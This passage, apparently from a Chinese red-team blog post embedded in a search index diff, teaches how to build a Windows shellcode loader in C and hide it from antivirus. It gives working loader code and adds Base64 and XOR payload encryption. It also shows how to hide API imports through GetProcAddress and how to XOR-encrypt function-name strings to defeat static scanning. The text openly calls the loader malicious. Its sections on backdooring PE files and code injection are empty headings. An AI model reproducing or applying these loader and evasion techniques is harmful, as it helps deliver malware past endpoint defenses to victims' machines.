+<li>exe：<code>nologo</code>禁止显示版权消息和版本号，<code>Ox</code>启用最快优化，<code>MT</code>运行时库由程序集成，<code>W0</code>禁止显示所有警告，<code>GS-</code>缓冲区安全检查，<code>DNDEBUG</code>关闭assert宏，<code>Tc</code>源文件，<code>link</code>传递给链接器的选项，<code>OUT</code>输出文件，<code>SUBSYSTEM</code>指定子系统，<code>MACHINE</code>系统架构</li>
+<li>dll：<code>/D_USRDLL /D_WINDLL</code>编译为dll</li>
+</ul>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exe</span></span><br><span class="line">cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /TcPEexe.cpp /link /OUT:PE.exe /SUBSYSTEM:CONSOLE /MACHINE:x64</span><br><span class="line"><span class="comment"># dll</span></span><br><span class="line">cl.exe /D_USRDLL /D_WINDLL PEdll.cpp /MT /link /DLL /OUT:PE.dll</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="编写一个Shellcode执行器"><a href="#编写一个Shellcode执行器" class="headerlink" title="编写一个Shellcode执行器"></a>编写一个Shellcode执行器</h1><h2 id="Shellcode与Shellcode-Loader"><a href="#Shellcode与Shellcode-Loader" class="headerlink" title="Shellcode与Shellcode Loader"></a>Shellcode与Shellcode Loader</h2><p>所谓Shellcode本质上就是一串字节码，将它们扔给CPU去执行就可以获得一个shell。而把这串机器码扔给CPU的工作就是由Shellcode Loader来进行的</p>
+<p>Shellcode Loader还有一些别名如Dropper等，其实本质上做的事情都一样</p>
+<h2 id="用C编写一个Shellcoder-Loader"><a href="#用C编写一个Shellcoder-Loader" class="headerlink" title="用C编写一个Shellcoder Loader"></a>用C编写一个Shellcoder Loader</h2><p>一个简单的Shellcode Loader如下所示，总体就分为四步，具体的参数可以查看<a class="link" href="https://learn.microsoft.com/zh-cn/windows/win32/api/_base/">微软WindowsAPI文档 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>    1. <code>VirtualAlloc</code>为Shellcode分配可读可写内存（还存在其他函数也可以分配）<br>    2. <code>RtlMoveMemory</code>将栈/堆中的Shellcode复制到申请的内存中<br>    3. <code>VirtualProtect</code>将可读可写的属性修改为可读可执行<br>    4. <code>CreateThread</code>创建线程执行Shellcode</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> {</span><br><span class="line">    </span><br><span class="line">	<span class="type">void</span> * exec_mem;</span><br><span class="line">	BOOL rv;</span><br><span class="line">	HANDLE th;</span><br><span class="line">    DWORD oldprotect = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> payload[] = {};</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> payload_len = <span class="keyword">sizeof</span>(payload);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Allocate a memory buffer for payload</span></span><br><span class="line">	exec_mem = VirtualAlloc(<span class="number">0</span>, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Copy payload to new buffer</span></span><br><span class="line">	RtlMoveMemory(exec_mem, payload, payload_len);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// Make new buffer as executable</span></span><br><span class="line">	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &amp;oldprotect);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// If all good, run the payload</span></span><br><span class="line">	<span class="keyword">if</span> ( rv != <span class="number">0</span> ) {</span><br><span class="line">			th = CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE) exec_mem, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">			WaitForSingleObject(th, <span class="number">-1</span>);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="简单的Shellcode隐蔽手段"><a href="#简单的Shellcode隐蔽手段" class="headerlink" title="简单的Shellcode隐蔽手段"></a>简单的Shellcode隐蔽手段</h1><p>完成了ShellcodeLoader，还需要对其内容进行加密，不然简单的字节比对就可以直接查杀到我们的Shellcode</p>
+<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>对于payload部分，可以使用<code>certutil -encode payload.bin payload.b64</code>对其进行Base64编码</p>
+<p>在WindowsAPI中，<code>CryptStringToBinary</code>函数的第三个参数可以设置编码类型，用于解码，调用头文件为<code>Wincrypt.h</code>和<code>pragma comment (lib,"Crypt32.lib")</code></p>
+<blockquote>
+<p><code>pragma comment</code>的作用是链接到lib库，本质上与编译时链接效果相同，不过一个是隐式调用一个是显式调用</p>
+</blockquote>
+<p>具体编码函数如下</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">DecodeBase64</span><span class="params">(<span class="type">const</span> BYTE *src, <span class="type">unsigned</span> <span class="type">int</span> srcLen, <span class="type">char</span> * dst, <span class="type">unsigned</span> <span class="type">int</span> dstLen)</span> {</span><br><span class="line">    DWORD outLen;</span><br><span class="line">    BOOL fRet;</span><br><span class="line"></span><br><span class="line">    outLen = dstLen;</span><br><span class="line">    fRet = CryptStringToBinary((LPCSTR) src, srcLen, CRYPT_STRING_BASE64, (BYTE *)dst, &amp;outLen, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!fRet) outLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> outLen;</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h2><p>加密的话本文介绍简单的异或加密，优点是容易实现，缺点是逆向的时候XOR函数也基本上能一眼看出来</p>
+<p>XOR原理就是逐字节将密文和密钥进行异或，加解密相同，比较简单不做过多介绍，直接给出实现如下</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">XOR</span><span class="params">(<span class="type">char</span> *data, <span class="type">size_t</span> data_len, <span class="type">char</span> *key, <span class="type">size_t</span> key_len)</span> {</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; data_len; i++) {</span><br><span class="line">        <span class="keyword">if</span>(j == key_len - <span class="number">1</span>)</span><br><span class="line">            j = <span class="number">0</span>;</span><br><span class="line">        data[i] = data[i] ^ key[j];</span><br><span class="line">        j++;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>
+
+<p>若想调用更复杂的加密函数，如AES或ECC等，可以考虑查询文档调用Windows的相应库，也可以考虑手动实现一个（比如换掉AES的不可约多项式手造一个加密算法），自己编写的加密函数在被逆向分析时也会更有难度</p>
+<h2 id="函数名混淆"><a href="#函数名混淆" class="headerlink" title="函数名混淆"></a>函数名混淆</h2><p>在我们编写的恶意<code>Loader</code>中，有时需要调用系统的API或者调用自己编写的dll，杀毒软件在静态查杀的时候会去查询<code>Loader</code>的导出表，导出表包含了所有调用的函数，如果找到了我们的恶意函数（如<code>VirtualProtect</code>），就会被杀死，因此需要对函数做混淆以绕过静态查杀</p>
+<blockquote>
+<p>对未混淆的目标，使用<code>dumpbin /imports implant.exe</code>查看函数导出表，可以看到目标函数<code>VirtualProtect</code><br><img lazyload="" src="/images/loading.svg" data-src="/images/WindowsEvasion/Part_1/ImportsTable.png" alt="ImportsTable"></p>
+</blockquote>
+<p>如何在不产生对应导出表的情况下调用函数，就需要使用到一些其他的函数来进行混淆，常用的函数是<code>handle=GetModuleHandle("sould.dll")</code>和<code>GetProcAddress(handle,"PlaySound")</code>，前者返回dll的语句柄，后者接受语句柄和要调用的函数名为参数，返回函数地址</p>
+<p>相较于之前直接调用<code>VirtualProtect</code>，使用上面两个函数就可以间接地对其进行调用，对比如下（<code>VirtualProtect</code>函数的声明需要查阅微软文档）</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Before</span></span><br><span class="line">rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &amp;oldprotect);</span><br><span class="line"><span class="comment">// After</span></span><br><span class="line"><span class="comment">// 全局声明，声明要调用的函数类型和对应的参数</span></span><br><span class="line">BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect</span><br><span class="line">); </span><br><span class="line"><span class="comment">// 进行调用</span></span><br><span class="line">pVirtualProtect = GetProcAddress(GetModuleHandle(<span class="string">"kernel32.dll"</span>),sVirtualProtect);</span><br><span class="line">	rv = pVirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &amp;oldprotect);</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="字符串混淆"><a href="#字符串混淆" class="headerlink" title="字符串混淆"></a>字符串混淆</h2><p>实现了函数混淆依旧不够，由于在混淆时简单的字符串查询<a class="link" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings">strings <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>还是可以直接找到我们的函数名，比如<code>strings -n 8 implant.exe</code>，原因是我们定义的<code>VirtualProtect</code>字符串会出现在data段，因此需要想办法对字符串本身进行隐藏，而这其实也不难，直接使用我们上面的XOR加密，其既然能对字符串payload加密自然也能对我们定义的其他字符串进行加密</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> key[] = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line"><span class="type">char</span> sVirtualProtect[] = { <span class="number">0x17</span>, <span class="number">0x2b</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0x27</span>, <span class="number">0x2b</span>, <span class="number">0x18</span>, <span class="number">0x3b</span>, <span class="number">0x25</span>, <span class="number">0x3f</span>, <span class="number">0x29</span>, <span class="number">0x2e</span>, <span class="number">0x3a</span> };</span><br><span class="line"><span class="comment">// 使用时先解密</span></span><br><span class="line">XOR((<span class="type">char</span> *) sVirtualProtect, <span class="built_in">strlen</span>(sVirtualProtect), key, <span class="keyword">sizeof</span>(key));</span><br><span class="line"><span class="comment">// 再进行调用</span></span><br><span class="line">pVirtualProtect = GetProcAddress(GetModuleHandle(<span class="string">"kernel32.dll"</span>),sVirtualProtect);</span><br><span class="line">rv = pVirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &amp;oldprotect);</span><br></pre></td></tr></table></figure></div>
+
+<p>最终效果图</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="/images/WindowsEvasion/Part_1/Obfuscation.png" alt="Obfuscation"></p>
+<h1 id="向PE文件加入后门"><a href="#向PE文件加入后门" class="headerlink" title="向PE文件加入后门"></a>向PE文件加入后门</h1><h1 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h1>]]></content>
+      <categories>
+        <category>Redteam</category>
+        <category>Windows Evasion</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+        <tag>Evasion</tag>
+        <tag>Redteam</tag>
+      </tags>
+  </entry>
+</search>
